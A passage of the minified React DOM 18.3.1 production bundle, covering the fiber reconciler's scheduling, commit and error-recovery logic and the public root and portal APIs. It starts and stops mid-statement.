if(t=r&-r,e.callbackPriority!==t){if(null!=n&&Je(n),1===t)0===e.tag?function(e){za=!0,Fa(e)}(ic.bind(null,e)):Fa(ic.bind(null,e)),oa(function(){0===(6&Tl)&&Va()}),n=null;else{switch(wt(r)){case 1:n=Ze;break;case 4:n=et;break;case 16:default:n=tt;break;case 536870912:n=rt}n=Cc(n,rc.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function rc(e,t){if(Yl=-1,Xl=0,0!==(6&Tl))throw Error(s(327));var n=e.callbackNode;if(_c()&&e.callbackNode!==n)return null;var r=ht(e,e===Cl?Rl:0);if(0===r)return null;if(0!==(30&r)||0!==(r&e.expiredLanes)||t)t=mc(e,r);else{t=r;var a=Tl;Tl|=2;var o=fc();for(Cl===e&&Rl===t||(Vl=null,Fl=Ye()+500,dc(e,t));;)try{vc();break}catch(l){hc(e,l)}js(),Sl.current=o,Tl=a,null!==Nl?t=0:(Cl=null,Rl=0,t=Al)}if(0!==t){if(2===t&&(0!==(a=pt(e))&&(r=a,t=ac(e,a))),1===t)throw n=Il,dc(e,0),oc(e,r),nc(e,Ye()),n;if(6===t)oc(e,r);else{if(a=e.current.alternate,0===(30&r)&&!function(e){for(var t=e;;){if(16384&t.flags){var n=t.updateQueue;if(null!==n&&null!==(n=n.stores))for(var r=0;r<n.length;r++){var a=n[r],s=a.getSnapshot;a=a.value;try{if(!ir(s(),a))return!1}catch(i){return!1}}}if(n=t.child,16384&t.subtreeFlags&&null!==n)n.return=t,t=n;else{if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}(a)&&(2===(t=mc(e,r))&&(0!==(o=pt(e))&&(r=o,t=ac(e,o))),1===t))throw n=Il,dc(e,0),oc(e,r),nc(e,Ye()),n;switch(e.finishedWork=a,e.finishedLanes=r,t){case 0:case 1:throw Error(s(345));case 2:case 5:wc(e,zl,Vl);break;case 3:if(oc(e,r),(130023424&r)===r&&10<(t=Bl+500-Ye())){if(0!==ht(e,0))break;if(((a=e.suspendedLanes)&r)!==r){Zl(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=ra(wc.bind(null,e,zl,Vl),t);break}wc(e,zl,Vl);break;case 4:if(oc(e,r),(4194240&r)===r)break;for(t=e.eventTimes,a=-1;0<r;){var i=31-ot(r);o=1<<i,(i=t[i])>a&&(a=i),r&=~o}if(r=a,10<(r=(120>(r=Ye()-r)?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*xl(r/1960))-r)){e.timeoutHandle=ra(wc.bind(null,e,zl,Vl),r);break}wc(e,zl,Vl);break;default:throw Error(s(329))}}}return nc(e,Ye()),e.callbackNode===n?rc.bind(null,e):null}function ac(e,t){var n=Ml;return e.current.memoizedState.isDehydrated&&(dc(e,t).flags|=256),2!==(e=mc(e,t))&&(t=zl,zl=n,null!==t&&sc(t)),e}function sc(e){null===zl?zl=e:zl.push.apply(zl,e)}function oc(e,t){for(t&=~Ul,t&=~Dl,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-ot(t),r=1<<n;e[n]=-1,t&=~r}}function ic(e){if(0!==(6&Tl))throw Error(s(327));_c();var t=ht(e,0);if(0===(1&t))return nc(e,Ye()),null;var n=mc(e,t);if(0!==e.tag&&2===n){var r=pt(e);0!==r&&(t=r,n=ac(e,r))}if(1===n)throw n=Il,dc(e,0),oc(e,t),nc(e,Ye()),n;if(6===n)throw Error(s(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,wc(e,zl,Vl),nc(e,Ye()),null}function lc(e,t){var n=Tl;Tl|=1;try{return e(t)}finally{0===(Tl=n)&&(Fl=Ye()+500,za&&Va())}}function cc(e){null!==Gl&&0===Gl.tag&&0===(6&Tl)&&_c();var t=Tl;Tl|=1;var n=jl.transition,r=bt;try{if(jl.transition=null,bt=1,e)return e()}finally{bt=r,jl.transition=n,0===(6&(Tl=t))&&Va()}}function uc(){Pl=Ol.current,Ea(Ol)}function dc(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(-1!==n&&(e.timeoutHandle=-1,aa(n)),null!==Nl)for(n=Nl.return;null!==n;){var r=n;switch(ts(r),r.tag){case 1:null!==(r=r.type.childContextTypes)&&void 0!==r&&Aa();break;case 3:Qs(),Ea(Na),Ea(Ca),no();break;case 5:Xs(r);break;case 4:Qs();break;case 13:case 19:Ea(Zs);break;case 10:Ts(r.type._context);break;case 22:case 23:uc()}n=n.return}if(Cl=e,Nl=e=Oc(e.current,null),Rl=Pl=t,Al=0,Il=null,Ul=Dl=Ll=0,zl=Ml=null,null!==Ps){for(t=0;t<Ps.length;t++)if(null!==(r=(n=Ps[t]).interleaved)){n.interleaved=null;var a=r.next,s=n.pending;if(null!==s){var o=s.next;s.next=a,r.next=o}n.pending=r}Ps=null}return e}function hc(e,t){for(;;){var n=Nl;try{if(js(),ro.current=Xo,co){for(var r=oo.memoizedState;null!==r;){var a=r.queue;null!==a&&(a.pending=null),r=r.next}co=!1}if(so=0,lo=io=oo=null,uo=!1,ho=0,El.current=null,null===n||null===n.return){Al=1,Il=t,Nl=null;break}e:{var o=e,i=n.return,l=n,c=t;if(t=Rl,l.flags|=32768,null!==c&&"object"===typeof c&&"function"===typeof c.then){var u=c,d=l,h=d.tag;if(0===(1&d.mode)&&(0===h||11===h||15===h)){var f=d.alternate;f?(d.updateQueue=f.updateQueue,d.memoizedState=f.memoizedState,d.lanes=f.lanes):(d.updateQueue=null,d.memoizedState=null)}var p=gi(i);if(null!==p){p.flags&=-257,vi(p,i,l,0,t),1&p.mode&&mi(o,u,t),c=u;var m=(t=p).updateQueue;if(null===m){var g=new Set;g.add(c),t.updateQueue=g}else m.add(c);break e}if(0===(1&t)){mi(o,u,t),pc();break e}c=Error(s(426))}else if(as&&1&l.mode){var v=gi(i);if(null!==v){0===(65536&v.flags)&&(v.flags|=256),vi(v,i,l,0,t),ps(ci(c,l));break e}}o=c=ci(c,l),4!==Al&&(Al=2),null===Ml?Ml=[o]:Ml.push(o),o=i;do{switch(o.tag){case 3:o.flags|=65536,t&=-t,o.lanes|=t,Fs(o,fi(0,c,t));break e;case 1:l=c;var y=o.type,b=o.stateNode;if(0===(128&o.flags)&&("function"===typeof y.getDerivedStateFromError||null!==b&&"function"===typeof b.componentDidCatch&&(null===Hl||!Hl.has(b)))){o.flags|=65536,t&=-t,o.lanes|=t,Fs(o,pi(o,l,t));break e}}o=o.return}while(null!==o)}bc(n)}catch(w){t=w,Nl===n&&null!==n&&(Nl=n=n.return);continue}break}}function fc(){var e=Sl.current;return Sl.current=Xo,null===e?Xo:e}function pc(){0!==Al&&3!==Al&&2!==Al||(Al=4),null===Cl||0===(268435455&Ll)&&0===(268435455&Dl)||oc(Cl,Rl)}function mc(e,t){var n=Tl;Tl|=2;var r=fc();for(Cl===e&&Rl===t||(Vl=null,dc(e,t));;)try{gc();break}catch(a){hc(e,a)}if(js(),Tl=n,Sl.current=r,null!==Nl)throw Error(s(261));return Cl=null,Rl=0,Al}function gc(){for(;null!==Nl;)yc(Nl)}function vc(){for(;null!==Nl&&!$e();)yc(Nl)}function yc(e){var t=kl(e.alternate,e,Pl);e.memoizedProps=e.pendingProps,null===t?bc(e):Nl=t,El.current=null}function bc(e){var t=e;do{var n=t.alternate;if(e=t.return,0===(32768&t.flags)){if(null!==(n=Ki(n,t,Pl)))return void(Nl=n)}else{if(null!==(n=Gi(n,t)))return n.flags&=32767,void(Nl=n);if(null===e)return Al=6,void(Nl=null);e.flags|=32768,e.subtreeFlags=0,e.deletions=null}if(null!==(t=t.sibling))return void(Nl=t);Nl=t=e}while(null!==t);0===Al&&(Al=5)}function wc(e,t,n){var r=bt,a=jl.transition;try{jl.transition=null,bt=1,function(e,t,n,r){do{_c()}while(null!==Gl);if(0!==(6&Tl))throw Error(s(327));n=e.finishedWork;var a=e.finishedLanes;if(null===n)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(s(177));e.callbackNode=null,e.callbackPriority=0;var o=n.lanes|n.childLanes;if(function(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var a=31-ot(n),s=1<<a;t[a]=0,r[a]=-1,e[a]=-1,n&=~s}}(e,o),e===Cl&&(Nl=Cl=null,Rl=0),0===(2064&n.subtreeFlags)&&0===(2064&n.flags)||Kl||(Kl=!0,Cc(tt,function(){return _c(),null})),o=0!==(15990&n.flags),0!==(15990&n.subtreeFlags)||o){o=jl.transition,jl.transition=null;var i=bt;bt=1;var l=Tl;Tl|=4,El.current=null,function(e,t){if(ea=Wt,fr(e=hr())){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{var r=(n=(n=e.ownerDocument)&&n.defaultView||window).getSelection&&n.getSelection();if(r&&0!==r.rangeCount){n=r.anchorNode;var a=r.anchorOffset,o=r.focusNode;r=r.focusOffset;try{n.nodeType,o.nodeType}catch(_){n=null;break e}var i=0,l=-1,c=-1,u=0,d=0,h=e,f=null;t:for(;;){for(var p;h!==n||0!==a&&3!==h.nodeType||(l=i+a),h!==o||0!==r&&3!==h.nodeType||(c=i+r),3===h.nodeType&&(i+=h.nodeValue.length),null!==(p=h.firstChild);)f=h,h=p;for(;;){if(h===e)break t;if(f===n&&++u===a&&(l=i),f===o&&++d===r&&(c=i),null!==(p=h.nextSibling))break;f=(h=f).parentNode}h=p}n=-1===l||-1===c?null:{start:l,end:c}}else n=null}n=n||{start:0,end:0}}else n=null;for(ta={focusedElem:e,selectionRange:n},Wt=!1,Yi=t;null!==Yi;)if(e=(t=Yi).child,0!==(1028&t.subtreeFlags)&&null!==e)e.return=t,Yi=e;else for(;null!==Yi;){t=Yi;try{var m=t.alternate;if(0!==(1024&t.flags))switch(t.tag){case 0:case 11:case 15:case 5:case 6:case 4:case 17:break;case 1:if(null!==m){var g=m.memoizedProps,v=m.memoizedState,y=t.stateNode,b=y.getSnapshotBeforeUpdate(t.elementType===t.type?g:ni(t.type,g),v);y.__reactInternalSnapshotBeforeUpdate=b}break;case 3:var w=t.stateNode.containerInfo;1===w.nodeType?w.textContent="":9===w.nodeType&&w.documentElement&&w.removeChild(w.documentElement);break;default:throw Error(s(163))}}catch(_){xc(t,t.return,_)}if(null!==(e=t.sibling)){e.return=t.return,Yi=e;break}Yi=t.return}m=el,el=!1}(e,n),ml(n,e),pr(ta),Wt=!!ea,ta=ea=null,e.current=n,vl(n,e,a),Qe(),Tl=l,bt=i,jl.transition=o}else e.current=n;if(Kl&&(Kl=!1,Gl=e,Jl=a),o=e.pendingLanes,0===o&&(Hl=null),function(e){if(st&&"function"===typeof st.onCommitFiberRoot)try{st.onCommitFiberRoot(at,e,void 0,128===(128&e.current.flags))}catch(t){}}(n.stateNode),nc(e,Ye()),null!==t)for(r=e.onRecoverableError,n=0;n<t.length;n++)a=t[n],r(a.value,{componentStack:a.stack,digest:a.digest});if(ql)throw ql=!1,e=Wl,Wl=null,e;0!==(1&Jl)&&0!==e.tag&&_c(),o=e.pendingLanes,0!==(1&o)?e===Ql?$l++:($l=0,Ql=e):$l=0,Va()}(e,t,n,r)}finally{jl.transition=a,bt=r}return null}function _c(){if(null!==Gl){var e=wt(Jl),t=jl.transition,n=bt;try{if(jl.transition=null,bt=16>e?16:e,null===Gl)var r=!1;else{if(e=Gl,Gl=null,Jl=0,0!==(6&Tl))throw Error(s(331));var a=Tl;for(Tl|=4,Yi=e.current;null!==Yi;){var o=Yi,i=o.child;if(0!==(16&Yi.flags)){var l=o.deletions;if(null!==l){for(var c=0;c<l.length;c++){var u=l[c];for(Yi=u;null!==Yi;){var d=Yi;switch(d.tag){case 0:case 11:case 15:tl(8,d,o)}var h=d.child;if(null!==h)h.return=d,Yi=h;else for(;null!==Yi;){var f=(d=Yi).sibling,p=d.return;if(al(d),d===u){Yi=null;break}if(null!==f){f.return=p,Yi=f;break}Yi=p}}}var m=o.alternate;if(null!==m){var g=m.child;if(null!==g){m.child=null;do{var v=g.sibling;g.sibling=null,g=v}while(null!==g)}}Yi=o}}if(0!==(2064&o.subtreeFlags)&&null!==i)i.return=o,Yi=i;else e:for(;null!==Yi;){if(0!==(2048&(o=Yi).flags))switch(o.tag){case 0:case 11:case 15:tl(9,o,o.return)}var y=o.sibling;if(null!==y){y.return=o.return,Yi=y;break e}Yi=o.return}}var b=e.current;for(Yi=b;null!==Yi;){var w=(i=Yi).child;if(0!==(2064&i.subtreeFlags)&&null!==w)w.return=i,Yi=w;else e:for(i=b;null!==Yi;){if(0!==(2048&(l=Yi).flags))try{switch(l.tag){case 0:case 11:case 15:nl(9,l)}}catch(k){xc(l,l.return,k)}if(l===i){Yi=null;break e}var _=l.sibling;if(null!==_){_.return=l.return,Yi=_;break e}Yi=l.return}}if(Tl=a,Va(),st&&"function"===typeof st.onPostCommitFiberRoot)try{st.onPostCommitFiberRoot(at,e)}catch(k){}r=!0}return r}finally{bt=n,jl.transition=t}}return!1}function kc(e,t,n){e=zs(e,t=fi(0,t=ci(n,t),1),1),t=Zl(),null!==e&&(vt(e,1,t),nc(e,t))}function xc(e,t,n){if(3===e.tag)kc(e,e,n);else for(;null!==t;){if(3===t.tag){kc(t,e,n);break}if(1===t.tag){var r=t.stateNode;if("function"===typeof t.type.getDerivedStateFromError||"function"===typeof r.componentDidCatch&&(null===Hl||!Hl.has(r))){t=zs(t,e=pi(t,e=ci(n,e),1),1),e=Zl(),null!==t&&(vt(t,1,e),nc(t,e));break}}t=t.return}}function Sc(e,t,n){var r=e.pingCache;null!==r&&r.delete(t),t=Zl(),e.pingedLanes|=e.suspendedLanes&n,Cl===e&&(Rl&n)===n&&(4===Al||3===Al&&(130023424&Rl)===Rl&&500>Ye()-Bl?dc(e,0):Ul|=n),nc(e,t)}function Ec(e,t){0===t&&(0===(1&e.mode)?t=1:(t=ut,0===(130023424&(ut<<=1))&&(ut=4194304)));var n=Zl();null!==(e=Is(e,t))&&(vt(e,t,n),nc(e,n))}function jc(e){var t=e.memoizedState,n=0;null!==t&&(n=t.retryLane),Ec(e,n)}function Tc(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,a=e.memoizedState;null!==a&&(n=a.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(s(314))}null!==r&&r.delete(t),Ec(e,n)}function Cc(e,t){return Ge(e,t)}function Nc(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Rc(e,t,n,r){return new Nc(e,t,n,r)}function Pc(e){return!(!(e=e.prototype)||!e.isReactComponent)}function Oc(e,t){var n=e.alternate;return null===n?((n=Rc(e.tag,t,e.key,e.mode)).elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=14680064&e.flags,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=null===t?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Ac(e,t,n,r,a,o){var i=2;if(r=e,"function"===typeof e)Pc(e)&&(i=1);else if("string"===typeof e)i=5;else e:switch(e){case x:return Ic(n.children,a,o,t);case S:i=8,a|=8;break;case E:return(e=Rc(12,n,t,2|a)).elementType=E,e.lanes=o,e;case N:return(e=Rc(13,n,t,a)).elementType=N,e.lanes=o,e;case R:return(e=Rc(19,n,t,a)).elementType=R,e.lanes=o,e;case A:return Lc(n,a,o,t);default:if("object"===typeof e&&null!==e)switch(e.$$typeof){case j:i=10;break e;case T:i=9;break e;case C:i=11;break e;case P:i=14;break e;case O:i=16,r=null;break e}throw Error(s(130,null==e?e:typeof e,""))}return(t=Rc(i,n,t,a)).elementType=e,t.type=r,t.lanes=o,t}function Ic(e,t,n,r){return(e=Rc(7,e,r,t)).lanes=n,e}function Lc(e,t,n,r){return(e=Rc(22,e,r,t)).elementType=A,e.lanes=n,e.stateNode={isHidden:!1},e}function Dc(e,t,n){return(e=Rc(6,e,null,t)).lanes=n,e}function Uc(e,t,n){return(t=Rc(4,null!==e.children?e.children:[],e.key,t)).lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Mc(e,t,n,r,a){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=gt(0),this.expirationTimes=gt(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=gt(0),this.identifierPrefix=r,this.onRecoverableError=a,this.mutableSourceEagerHydrationData=null}function zc(e,t,n,r,a,s,o,i,l){return e=new Mc(e,t,n,i,l),1===t?(t=1,!0===s&&(t|=8)):t=0,s=Rc(3,null,null,t),e.current=s,s.stateNode=e,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ds(s),e}function Bc(e){if(!e)return Ta;e:{if(Ve(e=e._reactInternals)!==e||1!==e.tag)throw Error(s(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(Oa(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(null!==t);throw Error(s(171))}if(1===e.tag){var n=e.type;if(Oa(n))return La(e,n,t)}return t}function Fc(e,t,n,r,a,s,o,i,l){return(e=zc(n,r,!0,e,0,s,0,i,l)).context=Bc(null),n=e.current,(s=Ms(r=Zl(),a=ec(n))).callback=void 0!==t&&null!==t?t:null,zs(n,s,a),e.current.lanes=a,vt(e,a,r),nc(e,r),e}function Vc(e,t,n,r){var a=t.current,s=Zl(),o=ec(a);return n=Bc(n),null===t.context?t.context=n:t.pendingContext=n,(t=Ms(s,o)).payload={element:e},null!==(r=void 0===r?null:r)&&(t.callback=r),null!==(e=zs(a,t,o))&&(tc(e,a,o,s),Bs(e,a,o)),o}function qc(e){return(e=e.current).child?(e.child.tag,e.child.stateNode):null}function Wc(e,t){if(null!==(e=e.memoizedState)&&null!==e.dehydrated){var n=e.retryLane;e.retryLane=0!==n&&n<t?n:t}}function Hc(e,t){Wc(e,t),(e=e.alternate)&&Wc(e,t)}kl=function(e,t,n){if(null!==e)if(e.memoizedProps!==t.pendingProps||Na.current)bi=!0;else{if(0===(e.lanes&n)&&0===(128&t.flags))return bi=!1,function(e,t,n){switch(t.tag){case 3:Ni(t),fs();break;case 5:Ys(t);break;case 1:Oa(t.type)&&Da(t);break;case 4:$s(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,a=t.memoizedProps.value;ja(ks,r._currentValue),r._currentValue=a;break;case 13:if(null!==(r=t.memoizedState))return null!==r.dehydrated?(ja(Zs,1&Zs.current),t.flags|=128,null):0!==(n&t.child.childLanes)?Di(e,t,n):(ja(Zs,1&Zs.current),null!==(e=qi(e,t,n))?e.sibling:null);ja(Zs,1&Zs.current);break;case 19:if(r=0!==(n&t.childLanes),0!==(128&e.flags)){if(r)return Fi(e,t,n);t.flags|=128}if(null!==(a=t.memoizedState)&&(a.rendering=null,a.tail=null,a.lastEffect=null),ja(Zs,Zs.current),r)break;return null;case 22:case 23:return t.lanes=0,Si(e,t,n)}return qi(e,t,n)}(e,t,n);bi=0!==(131072&e.flags)}else bi=!1,as&&0!==(1048576&t.flags)&&Za(t,Ka,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;Vi(e,t),e=t.pendingProps;var a=Pa(t,Ca.current);Ns(t,n),a=go(null,t,r,e,a,n);var o=vo();return t.flags|=1,"object"===typeof a&&null!==a&&"function"===typeof a.render&&void 0===a.$$typeof?(t.tag=1,t.memoizedState=null,t.updateQueue=null,Oa(r)?(o=!0,Da(t)):o=!1,t.memoizedState=null!==a.state&&void 0!==a.state?a.state:null,Ds(t),a.updater=ai,t.stateNode=a,a._reactInternals=t,li(t,r,e,n),t=Ci(null,t,r,!0,o,n)):(t.tag=0,as&&o&&es(t),wi(null,t,a,n),t=t.child),t;case 16:r=t.elementType;e:{switch(Vi(e,t),e=t.pendingProps,r=(a=r._init)(r._payload),t.type=r,a=t.tag=function(e){if("function"===typeof e)return Pc(e)?1:0;if(void 0!==e&&null!==e){if((e=e.$$typeof)===C)return 11;if(e===P)return 14}return 2}(r),e=ni(r,e),a){case 0:t=ji(null,t,r,e,n);break e;case 1:t=Ti(null,t,r,e,n);break e;case 11:t=_i(null,t,r,e,n);break e;case 14:t=ki(null,t,r,ni(r.type,e),n);break e}throw Error(s(306,r,""))}return t;case 0:return r=t.type,a=t.pendingProps,ji(e,t,r,a=t.elementType===r?a:ni(r,a),n);case 1:return r=t.type,a=t.pendingProps,Ti(e,t,r,a=t.elementType===r?a:ni(r,a),n);case 3:e:{if(Ni(t),null===e)throw Error(s(387));r=t.pendingProps,a=(o=t.memoizedState).element,Us(e,t),Vs(t,r,null,n);var i=t.memoizedState;if(r=i.element,o.isDehydrated){if(o={element:r,isDehydrated:!1,cache:i.cache,pendingSuspenseBoundaries:i.pendingSuspenseBoundaries,transitions:i.transitions},t.updateQueue.baseState=o,t.memoizedState=o,256&t.flags){t=Ri(e,t,r,n,a=ci(Error(s(423)),t));break e}if(r!==a){t=Ri(e,t,r,n,a=ci(Error(s(424)),t));break e}for(rs=ca(t.stateNode.containerInfo.firstChild),ns=t,as=!0,ss=null,n=_s(t,null,r,n),t.child=n;n;)n.flags=-3&n.flags|4096,n=n.sibling}else{if(fs(),r===a){t=qi(e,t,n);break e}wi(e,t,r,n)}t=t.child}return t;case 5:return Ys(t),null===e&&cs(t),r=t.type,a=t.pendingProps,o=null!==e?e.memoizedProps:null,i=a.children,na(r,a)?i=null:null!==o&&na(r,o)&&(t.flags|=32),Ei(e,t),wi(e,t,i,n),t.child;case 6:return null===e&&cs(t),null;case 13:return Di(e,t,n);case 4:return $s(t,t.stateNode.containerInfo),r=t.pendingProps,null===e?t.child=ws(t,null,r,n):wi(e,t,r,n),t.child;case 11:return r=t.type,a=t.pendingProps,_i(e,t,r,a=t.elementType===r?a:ni(r,a),n);case 7:return wi(e,t,t.pendingProps,n),t.child;case 8:case 12:return wi(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,a=t.pendingProps,o=t.memoizedProps,i=a.value,ja(ks,r._currentValue),r._currentValue=i,null!==o)if(ir(o.value,i)){if(o.children===a.children&&!Na.current){t=qi(e,t,n);break e}}else for(null!==(o=t.child)&&(o.return=t);null!==o;){var l=o.dependencies;if(null!==l){i=o.child;for(var c=l.firstContext;null!==c;){if(c.context===r){if(1===o.tag){(c=Ms(-1,n&-n)).tag=2;var u=o.updateQueue;if(null!==u){var d=(u=u.shared).pending;null===d?c.next=c:(c.next=d.next,d.next=c),u.pending=c}}o.lanes|=n,null!==(c=o.alternate)&&(c.lanes|=n),Cs(o.return,n,t),l.lanes|=n;break}c=c.next}}else if(10===o.tag)i=o.type===t.type?null:o.child;else if(18===o.tag){if(null===(i=o.return))throw Error(s(341));i.lanes|=n,null!==(l=i.alternate)&&(l.lanes|=n),Cs(i,n,t),i=o.sibling}else i=o.child;if(null!==i)i.return=o;else for(i=o;null!==i;){if(i===t){i=null;break}if(null!==(o=i.sibling)){o.return=i.return,i=o;break}i=i.return}o=i}wi(e,t,a.children,n),t=t.child}return t;case 9:return a=t.type,r=t.pendingProps.children,Ns(t,n),r=r(a=Rs(a)),t.flags|=1,wi(e,t,r,n),t.child;case 14:return a=ni(r=t.type,t.pendingProps),ki(e,t,r,a=ni(r.type,a),n);case 15:return xi(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:ni(r,a),Vi(e,t),t.tag=1,Oa(r)?(e=!0,Da(t)):e=!1,Ns(t,n),oi(t,r,a),li(t,r,a,n),Ci(null,t,r,!0,e,n);case 19:return Fi(e,t,n);case 22:return Si(e,t,n)}throw Error(s(156,t.tag))};var Kc="function"===typeof reportError?reportError:function(e){console.error(e)};function Gc(e){this._internalRoot=e}function Jc(e){this._internalRoot=e}function $c(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType)}function Qc(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType&&(8!==e.nodeType||" react-mount-point-unstable "!==e.nodeValue))}function Yc(){}function Xc(e,t,n,r,a){var s=n._reactRootContainer;if(s){var o=s;if("function"===typeof a){var i=a;a=function(){var e=qc(o);i.call(e)}}Vc(t,o,e,a)}else o=function(e,t,n,r,a){if(a){if("function"===typeof r){var s=r;r=function(){var e=qc(o);s.call(e)}}var o=Fc(t,r,e,0,null,!1,0,"",Yc);return e._reactRootContainer=o,e[pa]=o.current,Vr(8===e.nodeType?e.parentNode:e),cc(),o}for(;a=e.lastChild;)e.removeChild(a);if("function"===typeof r){var i=r;r=function(){var e=qc(l);i.call(e)}}var l=zc(e,0,!1,null,0,!1,0,"",Yc);return e._reactRootContainer=l,e[pa]=l.current,Vr(8===e.nodeType?e.parentNode:e),cc(function(){Vc(t,l,n,r)}),l}(n,t,e,a,r);return qc(o)}Jc.prototype.render=Gc.prototype.render=function(e){var t=this._internalRoot;if(null===t)throw Error(s(409));Vc(e,t,null,null)},Jc.prototype.unmount=Gc.prototype.unmount=function(){var e=this._internalRoot;if(null!==e){this._internalRoot=null;var t=e.containerInfo;cc(function(){Vc(null,e,null,null)}),t[pa]=null}},Jc.prototype.unstable_scheduleHydration=function(e){if(e){var t=St();e={blockedOn:null,target:e,priority:t};for(var n=0;n<At.length&&0!==t&&t<At[n].priority;n++);At.splice(n,0,e),0===n&&Ut(e)}},_t=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=dt(t.pendingLanes);0!==n&&(yt(t,1|n),nc(t,Ye()),0===(6&Tl)&&(Fl=Ye()+500,Va()))}break;case 13:cc(function(){var t=Is(e,1);if(null!==t){var n=Zl();tc(t,e,1,n)}}),Hc(e,1)}},kt=function(e){if(13===e.tag){var t=Is(e,134217728);if(null!==t)tc(t,e,134217728,Zl());Hc(e,134217728)}},xt=function(e){if(13===e.tag){var t=ec(e),n=Is(e,t);if(null!==n)tc(n,e,t,Zl());Hc(e,t)}},St=function(){return bt},Et=function(e,t){var n=bt;try{return bt=e,t()}finally{bt=n}},ke=function(e,t,n){switch(t){case"input":if(X(e,n),t=n.name,"radio"===n.type&&null!=t){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var a=_a(r);if(!a)throw Error(s(90));G(r),X(r,a)}}}break;case"textarea":se(e,n);break;case"select":null!=(t=n.value)&&ne(e,!!n.multiple,t,!1)}},Ce=lc,Ne=cc;var Zc={usingClientEntryPoint:!1,Events:[ba,wa,_a,je,Te,lc]},eu={findFiberByHostInstance:ya,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},tu={bundleType:eu.bundleType,version:eu.version,rendererPackageName:eu.rendererPackageName,rendererConfig:eu.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:w.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return null===(e=He(e))?null:e.stateNode},findFiberByHostInstance:eu.findFiberByHostInstance||function(){return null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__){var nu=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!nu.isDisabled&&nu.supportsFiber)try{at=nu.inject(tu),st=nu}catch(ue){}}t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Zc,t.createPortal=function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;if(!$c(t))throw Error(s(200));return function(e,t,n){var r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:k,key:null==r?null:""+r,children:e,containerInfo:t,implementation:n}}(e,t,null,n)},t.createRoot=function(e,t){if(!$c(e))throw Error(s(299));var n=!1,r="",a=Kc;return null!==t&&void 0!==t&&(!0===t.unstable_strictMode&&(n=!0),void 0!==t.identifierPrefix&&(r=t.identifierPrefix),void 0!==t.onRecoverableError&&(a=t.onRecoverableError)),t=zc(e,1,!1,null,0,n,0,r,a),e[pa]=t.current,Vr(8===e.nodeType?e.parentNode:e),new Gc(t)},t.findDOMNode=function(e){if(null==e)return null;if(1===e.nodeType)return e;var t=e._reactInternals;if(void 0===t){if("function"===typeof e.render)throw Error(s(188));throw e=Object.keys(e).join(","),Error(s(268,e))}return e=null===(e=He(t))?null:e.stateNode},t.flushSync=function(e){return cc(e)},t.hydrate=function(e,t,n){if(!Qc(t))throw 